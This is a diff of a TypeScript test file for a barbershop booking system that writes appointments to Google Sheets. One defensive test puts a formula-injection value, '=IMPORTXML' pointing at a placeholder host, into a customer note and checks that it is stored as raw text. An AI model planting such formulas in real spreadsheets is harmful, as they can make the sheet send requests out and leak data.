@@ -31,9 +31,11 @@ const { contextoDePrueba, SABADO, TELEFONO_A, TELEFONO_B } = await import('./hel
 type Ctx = Awaited<ReturnType<typeof contextoDePrueba>>;
 
 const ENCABEZADOS = [
-  'ID', 'Fecha', 'Día', 'Hora', 'Hora fin', 'Cliente', 'WhatsApp', 'Servicio',
-  'Precio', 'Duración', 'Estado', 'Fecha de creación', 'Última modificación', 'Observaciones',
+  'Fecha', 'Día', 'Hora', 'Cliente', 'Servicio', 'Precio', 'Descuento', 'Estado',
+  'WhatsApp', 'Hora fin', 'Observaciones', 'Creado', 'Modificado', 'ID',
 ];
+/** Posición de cada columna por su nombre, así los tests no dependen del orden. */
+const C = Object.fromEntries(ENCABEZADOS.map((nombre, i) => [nombre, i])) as Record<(typeof ENCABEZADOS)[number], number>;
 
 let ctx: Ctx;
 
@@ -58,7 +60,7 @@ after(async () => {
 
 /** Fila de la hoja "Turnos" correspondiente a un turno, sin el encabezado. */
 function filaDe(id: string): string[] | undefined {
-  return google.filas('Turnos').find((f) => f[0] === id);
+  return google.filas('Turnos').find((f) => f[C.ID] === id);
 }
 
 describe('un turno reservado termina en la planilla', () => {
@@ -81,17 +83,62 @@ describe('un turno reservado termina en la planilla', () => {
 
     const fila = filaDe(t.id);
     assert.ok(fila, 'el turno no llegó a la planilla');
-    assert.equal(fila[1], SABADO);
-    assert.equal(fila[2], 'sábado');
-    assert.equal(fila[3], '17:30');
-    assert.equal(fila[4], '18:45');
-    assert.equal(fila[5], 'Agustín');
-    assert.equal(fila[6], TELEFONO_A);
-    assert.equal(fila[7], 'Corte + Barba');
-    assert.equal(fila[8], '12000');
-    assert.equal(fila[9], '75 min');
-    assert.match(fila[10]!, /reservado/);
-    assert.equal(fila[13], 'viene con el hermano');
+    assert.equal(fila[C.Fecha], SABADO, 'año-mes-día: ordenada A→Z queda en orden cronológico');
+    assert.equal(fila[C.Día], 'Sábado 19/09');
+    assert.equal(fila[C.Hora], '17:30');
+    assert.equal(fila[C['Hora fin']], '18:45');
+    assert.equal(fila[C.Cliente], 'Agustín');
+    assert.equal(fila[C.WhatsApp], '+54 9 11 3333-4444', 'el teléfono se lee como teléfono, no como número');
+    assert.equal(fila[C.Servicio], 'Corte + Barba');
+    assert.equal(fila[C.Precio] as unknown, 12000, 'el precio va como número, para poder sumarlo');
+    assert.equal(fila[C.Descuento], '');
+    assert.match(fila[C.Estado]!, /reservado/);
+    assert.equal(fila[C.Observaciones], 'viene con el hermano');
+  });
+
+  test('se escribe tal cual: nada de lo que escribe un cliente se interpreta como fórmula', async () => {
+    await crearTurno(ctx, {
+      telefono: TELEFONO_A, nombre: 'Ana', servicioId: 'corte', fecha: SABADO, hora: '17:00', origen: 'panel',
+      observaciones: '=IMPORTXML("http://malo")',
+    });
+    await sincronizarPendientes(ctx);
+    const escrituras = google.pedidos.filter((p) => p.includes('/values/Turnos') && /valueInputOption=/.test(p));
+    assert.ok(escrituras.length > 0);
+    for (const p of escrituras) assert.match(p, /valueInputOption=RAW/, `escritura interpretada: ${p}`);
+  });
+
+  test('un horario apartado que nadie confirmó no aparece en el archivo', async () => {
+    const hold = await crearHold(ctx, { telefono: TELEFONO_A, nombre: 'Ana', servicioId: 'corte', fecha: SABADO, hora: '17:00' });
+    await cancelarTurno(ctx, hold.id, { telefono: TELEFONO_A, origen: 'whatsapp', forzar: true, motivo: 'cambio de idea' });
+    await sincronizarPendientes(ctx);
+    await resincronizarTodo(ctx);
+    assert.equal(filaDe(hold.id), undefined, 'un horario soltado no es un turno cancelado');
+    const semana = google.filas('Agenda semanal').flat().join(' | ');
+    assert.doesNotMatch(semana, /❌/, 'tampoco figura como cancelado en la agenda');
+  });
+
+  test('si alguien duplicó una fila a mano, resincronizar deja una sola', async () => {
+    const t = await crearTurno(ctx, { telefono: TELEFONO_A, nombre: 'Ana', servicioId: 'corte', fecha: SABADO, hora: '17:00', origen: 'whatsapp' });
+    await sincronizarPendientes(ctx);
+    google.filas('Turnos').push([...filaDe(t.id)!]);
+    assert.equal(google.filas('Turnos').filter((f) => f[C.ID] === t.id).length, 2, 'precondición');
+    await resincronizarTodo(ctx);
+    assert.equal(google.filas('Turnos').filter((f) => f[C.ID] === t.id).length, 1);
+  });
+
+  test('una hoja con las columnas viejas se pasa al orden nuevo sin perder filas', async () => {
+    google.hojas.set('Turnos', [
+      ['ID', 'Fecha', 'Día', 'Hora', 'Hora fin', 'Cliente', 'WhatsApp', 'Servicio', 'Precio', 'Duración', 'Estado', 'Fecha de creación', 'Última modificación', 'Observaciones'],
+      ['TUR-VIEJO1', '2026-08-01', 'sábado', '10:00', '10:45', 'Histórico', '5491100000000', 'Corte', '8000', '45 min', '✔️ completado', '01/08/2026 09:00', '01/08/2026 11:00', ''],
+    ]);
+    await resincronizarTodo(ctx);
+    assert.deepEqual(google.filas('Turnos')[0], ENCABEZADOS);
+    const viejo = filaDe('TUR-VIEJO1');
+    assert.ok(viejo, 'la fila histórica no se puede perder');
+    assert.equal(viejo[C.Cliente], 'Histórico');
+    assert.equal(viejo[C.Fecha], '2026-08-01');
+    assert.equal(viejo[C.Precio] as unknown, 8000);
+    assert.equal(viejo[C.Creado], '01/08/2026 09:00');
   });
 
   test('un turno sacado por WhatsApp, de punta a punta, aparece solo en la planilla', async () => {
@@ -100,10 +147,11 @@ describe('un turno reservado termina en la planilla', () => {
     }
     await sincronizarPendientes(ctx);
 
-    const fila = google.filas('Turnos').find((f) => f[5] === 'Martín');
+    const fila = google.filas('Turnos').find((f) => f[C.Cliente] === 'Martín');
     assert.ok(fila, 'el turno reservado por WhatsApp no llegó a Drive');
-    assert.equal(fila[3], '11:00');
-    assert.equal(fila[7], 'Corte');
+    assert.equal(fila[C.Hora], '11:00');
+    assert.equal(fila[C.Servicio], 'Corte');
+    assert.equal(google.filas('Turnos').length, 2, 'una sola fila: el horario apartado antes de confirmar no se escribe aparte');
   });
 
   test('cancelar actualiza la fila existente en vez de agregar otra', async () => {
@@ -112,9 +160,9 @@ describe('un turno reservado termina en la planilla', () => {
     await cancelarTurno(ctx, t.id, { telefono: TELEFONO_A, origen: 'whatsapp' });
     await sincronizarPendientes(ctx);
 
-    const deEseId = google.filas('Turnos').filter((f) => f[0] === t.id);
+    const deEseId = google.filas('Turnos').filter((f) => f[C.ID] === t.id);
     assert.equal(deEseId.length, 1, 'quedó duplicada la fila');
-    assert.match(deEseId[0]![10]!, /cancelado/);
+    assert.match(deEseId[0]![C.Estado]!, /cancelado/);
   });
 
   test('las vistas Hoy y Agenda semanal se rehacen con los turnos', async () => {
@@ -124,7 +172,7 @@ describe('un turno reservado termina en la planilla', () => {
     const semana = google.filas('Agenda semanal').flat().join(' | ');
     assert.match(semana, /Ana/);
     assert.match(semana, /17:00/);
-    assert.match(semana, /sábado/);
+    assert.match(semana, /Sábado/);
 
     const clientes = google.filas('Clientes').flat().join(' | ');
     assert.match(clientes, /Ana/);
@@ -142,7 +190,7 @@ describe('los turnos ya atendidos siguen a la vista', () => {
 
     const semana = google.filas('Agenda semanal').flat().join(' | ');
     assert.match(semana, /Ana ✓/, 'el turno atendido tiene que seguir en la agenda, con su marca');
-    assert.match(google.filas('Turnos').find((f) => f[0] === t.id)![10]!, /completado/);
+    assert.match(google.filas('Turnos').find((f) => f[C.ID] === t.id)![C.Estado]!, /vino/);
   });
 
   test('el que no vino también queda anotado', async () => {
